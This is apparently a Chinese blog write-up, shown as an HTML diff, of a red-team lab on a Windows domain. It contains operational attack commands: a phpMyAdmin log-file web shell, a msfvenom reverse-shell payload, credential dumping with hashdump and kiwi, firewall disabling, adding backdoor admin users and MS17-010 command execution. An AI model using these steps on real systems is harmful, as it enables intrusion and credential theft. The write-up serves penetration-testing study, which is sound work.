@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>ATTCK红队评估01 - Dark&amp;Lord</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">Dark&amp;Lord</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">ATTCK红队评估01</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1675045524719"
+                  >2023</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1680570813244"
+                  >2023</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h3 id="拓扑环境如下"><strong>拓扑环境如下：</strong></h3>
+<h3><img src="/_resources/d4dc9d08361d420186380e36fbd555db.png" /></h3>
+<h3 id="网卡配置如下">网卡配置如下：</h3>
+<h3 id="kali-19216855123">kali:  192.168.55.123</h3>
+<h3 id="win7-19216855130-19216852143内网网卡">win7:  192.168.55.130  &amp;&amp; 192.168.52.143(内网网卡)</h3>
+<h3 id="win2003-19216852141域内主机">win2003:  192.168.52.141(域内主机)</h3>
+<h3 id="win2008-19216852138域控">win2008:  192.168.52.138(域控)</h3>
+<hr />
+<h3 id="web渗透"><strong>web渗透：</strong></h3>
+<h3 id="首先进行主机发现看到win7的主机ip为19216855130开放了80和3306端口">首先，进行主机发现，看到win7的主机ip为192.168.55.130,开放了80和3306端口</h3>
+<h3 id="-2"><img src="/_resources/71f8a24f041148ba9ec7aabf89b358ae.png" alt="07fcb8ede9dd5d90de705162c665e8aa.png" width="589" height="278" class="jop-noMdConv" /></h3>
+<h3 id="访问80端口出现php探针页面">访问80端口，出现php探针页面</h3>
+<h3 id="-3"><img src="/_resources/3b4a0e4b75b34dfcb9f4be545777c6ab.png" alt="32bbf9e7bd2077c69e300b6438da01a5.png" width="657" height="472" class="jop-noMdConv" /></h3>
+<h3 id="扫描web目录">扫描web目录</h3>
+<h3 id="-4"><img src="/_resources/29574d42beee46a6a10e2172b8266362.png" alt="89d1743aa69c60a3bfc2332d30c45539.png" width="668" height="378" class="jop-noMdConv" /></h3>
+<h3 id="尝试用rootroot弱口令登录phpmyadmin成功登录">尝试用root/root弱口令登录phpmyadmin,成功登录</h3>
+<h3 id="-5"><img src="/_resources/b751e1743c1f4c1b9161983c8050b415.png" alt="a92e1ad4c67c847125930debd53a68ca.png" width="698" height="344" class="jop-noMdConv" /></h3>
+<h3 id="secure_file_privenull限制mysqld不允许导入导出">secure_file_prive=null，限制mysqld，不允许导入导出；</h3>
+<h3 id="-6"><img src="/_resources/50e303ad826244728902990e41f68d05.png" alt="fa53217ae23aa68f7a549833c052eef6.png" width="675" height="129" class="jop-noMdConv" /></h3>
+<h3 id="查询日志写入是否开启">查询日志写入是否开启</h3>
+<h3 id="-7"><img src="/_resources/af437cb6fba94ff89d454c09e403bbd9.png" alt="67e97109aa6d408ac664c4721cad6c1b.png" width="611" height="299" class="jop-noMdConv" /></h3>
+<h3 id="开启日志并修改日志保存路径">开启日志并修改日志保存路径</h3>
+<h3 id="set-global-general_log-on"><code>set global general_log = on;</code></h3>
+<h3 id="set-global-general_log_filecphpstudywwwshellphp"><code>set global general_log_file='C:\\phpStudy\\WWW\\shell.php';</code></h3>
+<h3 id="-8"><img src="/_resources/3cdba4b0186748d7b402daa495e68c42.png" alt="aaa2218d2157402b5bcb8dca51183cdc.png" width="730" height="317" class="jop-noMdConv" /></h3>
+<h3 id="然后select-php-eval_posta写入shell至日志文件">然后<code>select '&lt;?php @eval($_POST[a]);?&gt;'</code>写入shell至日志文件</h3>
+<h3 id="尝试连接shell成功连接">尝试连接shell，成功连接</h3>
+<h3 id="-9"><img src="/_resources/f43585428e07445a8b9de68c9b66b483.png" alt="c54d71fc26fb24d5f4ce3104598e7fcf.png" width="757" height="300" class="jop-noMdConv" /></h3>
+<h3 id="也可以通过yxcms进行getshell">也可以通过yxcms进行getshell</h3>
+<hr />
+<h3 id="内网渗透">内网渗透：</h3>
+<h3 id="制作一个msf木马并上传至目标服务器并设置连接">制作一个msf木马并上传至目标服务器，并设置连接</h3>
+<h3 id="msfvenom-p-windowsmeterpreterreverse_tcp-lhost19216855123-lport5678-f-exe-o-shellexe"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.55.123 LPORT=5678 -f exe -o shell.exe</code></h3>
+<h3 id="-10"><img src="/_resources/07bb66e93b3f4c3ca3d46f8e5a17ab84.png" alt="1a559cb4fc3f9080f1027fc14928b1fc.png" width="850" height="392" class="jop-noMdConv" /></h3>
+<h3 id="psmeterpretre-shell如果乱码可以输入chcp-65001去除乱码"><strong>PS：meterpretre shell如果乱码，可以输入<code>chcp 65001</code>去除乱码</strong></h3>
+<h3 id="查看主机信息可以看到该主机属于godorg域中内网网卡ip为19216852143">查看主机信息，可以看到该主机属于<code>god.org</code>域中，内网网卡ip为192.168.52.143</h3>
+<div><pre class="hljs"><code><span class="hljs-attribute">C</span>:\phpStudy\WWW&gt;ipconfig /<span class="hljs-literal">all</span>
+<span class="hljs-attribute">ipconfig</span> /<span class="hljs-literal">all</span>
+
+<span class="hljs-attribute">Windows</span> IP Configuration
+
+   <span class="hljs-attribute">Host</span> Name . . . . . . . . . . . . : stu1
+   <span class="hljs-attribute">Primary</span> Dns Suffix  . . . . . . . : god.org
+   <span class="hljs-attribute">Node</span> Type . . . . . . . . . . . . : Hybrid
+   <span class="hljs-attribute">IP</span> Routing Enabled. . . . . . . . : No
+   <span class="hljs-attribute">WINS</span> Proxy Enabled. . . . . . . . : No
+   <span class="hljs-attribute">DNS</span> Suffix Search List. . . . . . : god.org
+
+<span class="hljs-attribute">Ethernet</span> adapter �������� <span class="hljs-number">5</span>:
+
+   <span class="hljs-attribute">Connection</span>-specific DNS Suffix  . : 
+   <span class="hljs-attribute">Description</span> . . . . . . . . . . . : Intel(R) PRO/<span class="hljs-number">1000</span> MT Network Connection #<span class="hljs-number">3</span>
+   <span class="hljs-attribute">Physical</span> Address. . . . . . . . . : <span class="hljs-number">00</span>-<span class="hljs-number">0</span>C-<span class="hljs-number">29</span>-A7-C1-B2
+   <span class="hljs-attribute">DHCP</span> Enabled. . . . . . . . . . . : No
+   <span class="hljs-attribute">Autoconfiguration</span> Enabled . . . . : Yes
+   <span class="hljs-attribute">Link</span>-local IPv6 Address . . . . . : fe80::<span class="hljs-number">98</span>c:bf05:<span class="hljs-number">1</span>e5c:<span class="hljs-number">5</span>fbb%<span class="hljs-number">26</span>(Preferred) 
+   <span class="hljs-attribute">IPv4</span> Address. . . . . . . . . . . : <span class="hljs-number">192.168.55.130</span>(Preferred) 
+   <span class="hljs-attribute">Subnet</span> Mask . . . . . . . . . . . : <span class="hljs-number">255.255.255.0</span>
+   <span class="hljs-attribute">Default</span> Gateway . . . . . . . . . : 
+   <span class="hljs-attribute">DHCPv6</span> IAID . . . . . . . . . . . : <span class="hljs-number">721423401</span>
+   <span class="hljs-attribute">DHCPv6</span> Client DUID. . . . . . . . : <span class="hljs-number">00</span>-<span class="hljs-number">01</span>-<span class="hljs-number">00</span>-<span class="hljs-number">01</span>-<span class="hljs-number">24</span>-F3-A2-<span class="hljs-number">4</span>E-<span class="hljs-number">00</span>-<span class="hljs-number">0</span>C-<span class="hljs-number">29</span>-A7-C1-A8
+   <span class="hljs-attribute">DNS</span> Servers . . . . . . . . . . . : fec0:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:ffff::<span class="hljs-number">1</span>%<span class="hljs-number">1</span>
+                                       <span class="hljs-attribute">fec0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:ffff::<span class="hljs-number">2</span>%<span class="hljs-number">1</span>
+                                       <span class="hljs-attribute">fec0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:ffff::<span class="hljs-number">3</span>%<span class="hljs-number">1</span>
+   <span class="hljs-attribute">NetBIOS</span> over Tcpip. . . . . . . . : Enabled
+
+<span class="hljs-attribute">Ethernet</span> adapter ��������:
+
+   <span class="hljs-attribute">Connection</span>-specific DNS Suffix  . : 
+   <span class="hljs-attribute">Description</span> . . . . . . . . . . . : Intel(R) PRO/<span class="hljs-number">1000</span> MT Network Connection
+   <span class="hljs-attribute">Physical</span> Address. . . . . . . . . : <span class="hljs-number">00</span>-<span class="hljs-number">0</span>C-<span class="hljs-number">29</span>-A7-C1-A8
+   <span class="hljs-attribute">DHCP</span> Enabled. . . . . . . . . . . : No
+   <span class="hljs-attribute">Autoconfiguration</span> Enabled . . . . : Yes
+   <span class="hljs-attribute">Link</span>-local IPv6 Address . . . . . : fe80::fcff:cf71:<span class="hljs-number">1487</span>:<span class="hljs-number">9</span>c27%<span class="hljs-number">11</span>(Preferred) 
+   <span class="hljs-attribute">IPv4</span> Address. . . . . . . . . . . : <span class="hljs-number">192.168.52.143</span>(Preferred) 
+   <span class="hljs-attribute">Subnet</span> Mask . . . . . . . . . . . : <span class="hljs-number">255.255.255.0</span>
+   <span class="hljs-attribute">Default</span> Gateway . . . . . . . . . : <span class="hljs-number">192.168.52.2</span>
+   <span class="hljs-attribute">DHCPv6</span> IAID . . . . . . . . . . . : <span class="hljs-number">234884137</span>
+   <span class="hljs-attribute">DHCPv6</span> Client DUID. . . . . . . . : <span class="hljs-number">00</span>-<span class="hljs-number">01</span>-<span class="hljs-number">00</span>-<span class="hljs-number">01</span>-<span class="hljs-number">24</span>-F3-A2-<span class="hljs-number">4</span>E-<span class="hljs-number">00</span>-<span class="hljs-number">0</span>C-<span class="hljs-number">29</span>-A7-C1-A8
+   <span class="hljs-attribute">DNS</span> Servers . . . . . . . . . . . : <span class="hljs-number">192.168.52.138</span>
+                                       <span class="hljs-attribute">8</span>.<span class="hljs-number">8</span>.<span class="hljs-number">8</span>.<span class="hljs-number">8</span>
+   <span class="hljs-attribute">NetBIOS</span> over Tcpip. . . . . . . . : Enabled</code></pre></div>
+<h3 id="systeminfo信息">systeminfo信息</h3>
+<div><pre class="hljs"><code>C:\phpStudy\WWW&gt;systeminfo
+<span class="hljs-attribute">systeminfo
+
+Host Name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                STU1</span>
+<span class="hljs-attribute">OS Name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                  Microsoft Windows 7 专业版 </span>
+<span class="hljs-attribute">OS Version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">               6.1.7601 Service Pack 1 Build 7601</span>
+<span class="hljs-attribute">OS Manufacturer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">          Microsoft Corporation</span>
+<span class="hljs-attribute">OS Configuration</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         Member Workstation</span>
+<span class="hljs-attribute">OS Build Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">            Multiprocessor Free</span>
+<span class="hljs-attribute">Registered Owner</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         Windows 用户</span>
+<span class="hljs-attribute">Registered Organization</span><span class="hljs-punctuation">:   </span>
+<span class="hljs-attribute">Product ID</span><span class="hljs-punctuation">:</span> <span class="hljs-string">               00371-177-0000061-85693</span>
+<span class="hljs-attribute">Original Install Date</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    2019/8/25, 9:54:10</span>
+<span class="hljs-attribute">System Boot Time</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         2023/2/1, 10:41:12</span>
+<span class="hljs-attribute">System Manufacturer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      VMware, Inc.</span>
+<span class="hljs-attribute">System Model</span><span class="hljs-punctuation">:</span> <span class="hljs-string">             VMware Virtual Platform</span>
+<span class="hljs-attribute">System Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">              x64-based PC</span>
+<span class="hljs-attribute">Processor(s)</span><span class="hljs-punctuation">:</span> <span class="hljs-string">             1 Processor(s) Installed.</span>
+                           <span class="hljs-attribute">[01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">AMD64 Family 25 Model 80 Stepping 0 AuthenticAMD ~3194 Mhz</span>
+<span class="hljs-attribute">BIOS Version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">             Phoenix Technologies LTD 6.00, 2020/11/12</span>
+<span class="hljs-attribute">Windows Directory</span><span class="hljs-punctuation">:</span> <span class="hljs-string">        C:\Windows</span>
+<span class="hljs-attribute">System Directory</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         C:\Windows\system32</span>
+<span class="hljs-attribute">Boot Device</span><span class="hljs-punctuation">:</span> <span class="hljs-string">              \Device\HarddiskVolume1</span>
+<span class="hljs-attribute">System Locale</span><span class="hljs-punctuation">:</span> <span class="hljs-string">            zh-cn;Chinese (China)</span>
+<span class="hljs-attribute">Input Locale</span><span class="hljs-punctuation">:</span> <span class="hljs-string">             zh-cn;Chinese (China)</span>
+<span class="hljs-attribute">Time Zone</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi</span>
+<span class="hljs-attribute">Total Physical Memory</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    2,047 MB</span>
+<span class="hljs-attribute">Available Physical Memory</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1,284 MB</span>
+<span class="hljs-attribute">Virtual Memory</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Max Size:  4,095 MB</span>
+<span class="hljs-attribute">Virtual Memory</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Available: 3,218 MB</span>
+<span class="hljs-attribute">Virtual Memory</span><span class="hljs-punctuation">:</span> <span class="hljs-string">In Use:    877 MB</span>
+<span class="hljs-attribute">Page File Location(s)</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    C:\pagefile.sys</span>
+<span class="hljs-attribute">Domain</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                   god.org</span>
+<span class="hljs-attribute">Logon Server</span><span class="hljs-punctuation">:</span> <span class="hljs-string">             \\OWA</span>
+<span class="hljs-attribute">Hotfix(s)</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                4 Hotfix(s) Installed.</span>
+                           <span class="hljs-attribute">[01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KB2534111</span>
+                           <span class="hljs-attribute">[02]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KB2999226</span>
+                           <span class="hljs-attribute">[03]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KB958488</span>
+                           <span class="hljs-attribute">[04]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KB976902</span>
+<span class="hljs-attribute">Network Card(s)</span><span class="hljs-punctuation">:</span> <span class="hljs-string">          5 NIC(s) Installed.</span>
+                           <span class="hljs-attribute">[01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Intel(R) PRO/1000 MT Network Connection</span>
+                                 <span class="hljs-attribute">Connection Name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">本地连接</span>
+                                 <span class="hljs-attribute">DHCP Enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">   No</span>
+                                 <span class="hljs-attribute">IP address(es)
+                                 [01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.52.143</span>
+                                 <span class="hljs-attribute">[02]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">fe80::fcff:cf71:1487:9c27</span>
+                           <span class="hljs-attribute">[02]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TAP-Windows Adapter V9</span>
+                                 <span class="hljs-attribute">Connection Name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">本地连接 2</span>
+                                 <span class="hljs-attribute">Status</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         Media disconnected</span>
+                           <span class="hljs-attribute">[03]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Microsoft Loopback Adapter</span>
+                                 <span class="hljs-attribute">Connection Name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Npcap Loopback Adapter</span>
+                                 <span class="hljs-attribute">DHCP Enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">   Yes</span>
+                                 <span class="hljs-attribute">DHCP Server</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    255.255.255.255</span>
+                                 <span class="hljs-attribute">IP address(es)
+                                 [01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">169.254.129.186</span>
+                                 <span class="hljs-attribute">[02]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">fe80::b461:ccad:e30f:81ba</span>
+                           <span class="hljs-attribute">[04]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TAP-Windows Adapter V9</span>
+                                 <span class="hljs-attribute">Connection Name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">本地连接 3</span>
+                                 <span class="hljs-attribute">Status</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         Media disconnected</span>
+                           <span class="hljs-attribute">[05]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Intel(R) PRO/1000 MT Network Connection</span>
+                                 <span class="hljs-attribute">Connection Name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">本地连接 5</span>
+                                 <span class="hljs-attribute">DHCP Enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">   No</span>
+                                 <span class="hljs-attribute">IP address(es)
+                                 [01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.55.130</span>
+                                 <span class="hljs-attribute">[02]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">fe80::98c:bf05:1e5c:5fbb</span></code></pre></div>
+<h3 id="尝试getsystem并成功">尝试getsystem并成功</h3>
+<h3 id="-11"><img src="/_resources/d4d92fde88584161880d931e32e9ddad.png" alt="b11b43d98e71ea34b1a8956cd7f412d9.png" width="674" height="149" class="jop-noMdConv" /></h3>
+<div><pre class="hljs"><code>信息收集
+ipconfig /all 查询本机IP段，所在域等
+net config Workstation 当前计算机名，全名，用户名，系统版本，工作站域，登陆域
+net <span class="hljs-keyword">user</span> <span class="hljs-title">本机用户列表
+net</span> localhroup administrators 本机管理员[通常含有域用户]
+net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span> 查询域用户
+net <span class="hljs-keyword">user</span> <span class="hljs-title">用户名 /domain</span> 获取指定用户的账户信息
+net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span> b404 pass 修改域内用户密码，需要管理员权限
+net <span class="hljs-keyword">group</span> <span class="hljs-title">/domain</span> 查询域里面的工作组
+net <span class="hljs-keyword">group</span> <span class="hljs-title">组名 /domain</span> 查询域中的某工作组
+net <span class="hljs-keyword">group</span> <span class="hljs-title">“domain</span> admins” /domain 查询域管理员列表
+net <span class="hljs-keyword">group</span> <span class="hljs-title">“domain</span> controllers” /domain 查看域控制器(如果有多台)
+net time /domain 判断主域，主域服务器都做时间服务器
+ipconfig /all 查询本机IP段，所在域等</code></pre></div>
+<h3 id="收集域内信息"><strong>收集域内信息</strong></h3>
+<h3 id="查看域用户">查看域用户</h3>
+<h3 id="-12"><strong><img src="/_resources/e5372bc5e0af49d8824d13bada8cba29.png" alt="c08c4728ee3497b4ec1b5d7f6d44e5a7.png" width="785" height="227" class="jop-noMdConv" /></strong></h3>
+<h3 id="查看域管">查看域管</h3>
+<h3 id="-13"><img src="/_resources/a0d1ff81ae62481c8363520bc0248b3b.png" alt="cb4c3d443f994cfa5b4b87b42b8f982c.png" width="784" height="253" class="jop-noMdConv" /></h3>
+<h3 id="定位域控域控一般都为时间服务器">定位域控，域控一般都为时间服务器</h3>
+<div><pre class="hljs"><code>C:\Windows\system32&gt;net <span class="hljs-built_in">time</span> /<span class="hljs-built_in">domain</span>
+net <span class="hljs-built_in">time</span> /<span class="hljs-built_in">domain</span>
+Current <span class="hljs-built_in">time</span> <span class="hljs-built_in">at</span> \\owa.god.org <span class="hljs-built_in">is</span> <span class="hljs-number">2023</span>/<span class="hljs-number">2</span>/<span class="hljs-number">1</span> <span class="hljs-number">11</span>:<span class="hljs-number">41</span>:<span class="hljs-number">04</span>
+
+The command completed successfully.</code></pre></div>
+<h3 id="确定域控ip为19216852138">确定域控ip为<code>192.168.52.138</code></h3>
+<h3 id="-14"><img src="/_resources/e8ab25a50ff44b4d904fa352613d69ac.png" alt="87dc8d994343b159810ad8ee0e203330.png" width="566" height="220" class="jop-noMdConv" /></h3>
+<h3 id="接下来迁移会话进程">接下来迁移会话进程</h3>
+<h3 id="-15"><img src="/_resources/c758606085fb42b898fd112152c82aa3.png" alt="27f352614a4bc73c6757751ab1527dbe.png" width="608" height="211" class="jop-noMdConv" /></h3>
+<h3 id="hashdump">hashdump</h3>
+<h3 id="ps格式是用户名称-ridlm-hash-值-nt-hash-值rid-是-windows-系统账户对应固定的值类似于-linux-的-uidgid-号500-为-administrator501-为-guest-等-而-lm-的-hash-和-nt-的-hash都是对用户密码进行的加密只不过加密方式不一样-复制其中一种加密的-hash-可以直接使用在线-cmd5-破解"><strong>PS:格式是：用户名称: RID:LM-HASH 值: NT-HASH 值，rid 是 windows 系统账户对应固定的值，类似于 linux 的 uid，gid 号，500 为 administrator，501 为 guest 等。而 lm 的 hash 和 nt 的 hash,都是对用户密码进行的加密，只不过加密方式不一样。复制其中一种加密的 hash 可以直接使用在线 cmd5 破解</strong></h3>
+<div><pre class="hljs"><code>meterpreter &gt; hashdump
+Administrator:<span class="hljs-number">500</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>:::
+Guest:<span class="hljs-number">501</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>:::
+liukaifeng<span class="hljs-number">01</span>:<span class="hljs-number">1000</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>:::</code></pre></div>
+<h3 id="由于已经获得system权限可以加载load-kiwi模块creds_all导出明文密码hongrisec2019">由于已经获得system权限，可以加载<code>load kiwi</code>模块，<code>creds_all</code>导出明文密码<code>hongrisec@2019</code></h3>
+<h3 id="-16"><img src="/_resources/d1d41523e4db455e9648974590d5ead2.png" alt="c422e005743256a98801712346950f00.png" width="621" height="421" class="jop-noMdConv" /></h3>
+<h3 id="查看3389开放情况并尝试打开3389关闭防火墙连接远程桌面">查看3389开放情况，并尝试打开3389,关闭防火墙，连接远程桌面</h3>
+<h3 id="netstat-an-findstr-3389查看远程端口"><code>netstat -an | findstr “3389”</code>查看远程端口</h3>
+<h3 id="-17"><img src="/_resources/7b957aa394c3421b8e732e0bab6a1dcd.png" alt="ac6d64d06ae5849031880b418f431f75.png" width="320" height="66" class="jop-noMdConv" /></h3>
+<h3 id="开启3389reg-add-hklmsystemcurrentcontrolsetcontrolterminal-server-v-fdenytsconnections-t-reg_dword-d-00000000-f">开启3389<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></h3>
+<h3 id="关闭3389reg-add-hklmsystemcurrentcontrolsetcontrolterminal-server-v-fdenytsconnections-t-reg_dword-d-11111111-f">关闭3389<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f）</code></h3>
+<h3 id="-18"><img src="/_resources/02ef0f7531224e22ad814b388e83ec54.png" alt="2d2d14840721f3512a00006c0d226771.png" width="876" height="94" class="jop-noMdConv" /></h3>
+<h3 id="关闭防火墙">关闭防火墙：</h3>
+<h3 id="windows-server-2003-系统及之前版本netsh-firewall-set-opmode-disable">Windows Server 2003 系统及之前版本<code>netsh firewall set opmode disable</code></h3>
+<h3 id="windows-server-2003-之后系统版本netsh-advfirewall-set-allprofiles-state-off">Windows Server 2003 之后系统版本<code>netsh advfirewall set allprofiles state off</code></h3>
+<h3 id="或者">或者</h3>
+<h3 id="允许-3389-端口放行netsh-advfirewall-firewall-add-rule-nameremote-desktop-protocoltcp-dirin-localport3389-actionallow">允许 3389 端口放行<code>netsh advfirewall firewall add rule name=“Remote Desktop” protocol=TCP dir=in localport=3389 action=allow</code></h3>
+<h3 id="-19"><img src="/_resources/8eff7949206a4d9ca905768a56daa2b2.png" alt="1651239ba9f818ff90063a8694365f8b.png" width="795" height="155" class="jop-noMdConv" /> <img src="/_resources/f1be929d094944adbd926e785f0db02b.png" alt="e5cb6c0126740c8c4a45c4ce956941d9.png" width="625" height="369" class="jop-noMdConv" /></h3>
+<h3 id="可以添加一个用户备用啥的">可以添加一个用户备用啥的</h3>
+<h3 id="net-user-username-password-add"><code>net user [username] [password] /add</code></h3>
+<h3 id="添加到administrators用户组">添加到Administrators用户组</h3>
+<h3 id="net-localgroup-administrators-username-add"><code>net localgroup Administrators [username] /add</code></h3>
+<h3 id="激活用户">激活用户</h3>
+<h3 id="net-user-username-activeyes"><code>net user [username] /active:yes</code></h3>
+<h3 id="-20"><img src="/_resources/4923780f9dfd48f9a1b2adb7bc108d42.png" alt="207d46dba19b1687398b68b3cf6a0d67.png" width="653" height="314" class="jop-noMdConv" /></h3>
+<h3 id="搭建代理横向渗透">搭建代理–横向渗透</h3>
+<h3 id="由于已经发现win7存在内网19216852的c段搭建代理通道">由于已经发现win7存在内网<code>192.168.52</code>的c段，搭建代理通道</h3>
+<h3 id="首先添加路由并将会话切至后台">首先添加路由,并将会话切至后台</h3>
+<h3 id="-21"><img src="/_resources/adca67284ade4fc2b62234b0bf2583d9.png" alt="89c270848e19b7ee2adb05c213b64f1c.png" width="672" height="448" class="jop-noMdConv" /></h3>
+<h3 id="设置socks代理">设置socks代理</h3>
+<h3 id="-22"><img src="/_resources/f60d2401418249039053836f76e94768.png" alt="a5f97594e23c016057808cd2c2101c67.png" width="714" height="495" class="jop-noMdConv" /></h3>
+<h3 id="再设置proxychains代理配置为msf的socks代理端口etcproxychains4conf">再设置proxychains代理配置为msf的socks代理端口<code>/etc/proxychains4.conf</code></h3>
+<h3 id="-23"><img src="/_resources/eff53a50574c45799e977597ed8bd97f.png" /></h3>
+<h3 id="探测52网段主机存活">探测52网段主机存活</h3>
+<h3 id="-24"><img src="/_resources/ff9ff06e6555469facae1811d4003314.png" alt="4a193f55aec5181a4eb84bb00418077d.png" width="707" height="336" class="jop-noMdConv" /></h3>
+<p>首先先<code>win2003</code>–<code>192.168.52.141</code></p>
+<p>使用<code>use auxiliary/scanner/portscan/tcp </code>对<code>192.168.52.141</code>进行端口扫描</p>
+<img src="/_resources/8cf4620875544ff880a5d768faeff32c.png" alt="d1434ac9f728648054b21c4e15252cec.png" width="776" height="302" class="jop-noMdConv" />
+<p>可以看到开启了445端口，探测下samba服务<code>use auxiliary/scanner/smb/smb_version</code></p>
+<img src="/_resources/5748ecfedd4e41dab4368d8532013645.png" alt="de2abf95fff0e219af5dc0d615b8a896.png" width="764" height="132" class="jop-noMdConv" />
+<p>测试smb相关的漏洞</p>
+<p><code>use auxiliary/admin/smb/ms17_010_command</code></p>
+<img src="/_resources/138035cefacd41b49a14ac8da3941842.png" alt="466ee5a98ddb1f51f3989f0694b2770e.png" width="801" height="386" class="jop-noMdConv" />
+<p>设置命令–&gt;添加一个用户并设置管理员权限，然后开启3389端口</p>
+<p><code>set command "net user hack #hack123@ /add" 创建用户</code></p>
+<p><code>set command "net localgroup Administrators hack /add"</code></p>
+<p><code>set command ‘REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f’ 打开3389端口</code></p>
+<p><code>set command "netsh firewall set opmode mode=disable" 关闭防火墙</code></p>
+<img src="/_resources/a1847f363e9a4b3c86c22290cce82f8a.png" alt="8427bec12f778b75daac39158c670acb.png" width="660" height="466" class="jop-noMdConv" />
+<hr />
+<h2 id="拿下域控权限">拿下域控权限</h2>
+<p>扫描域控端口</p>
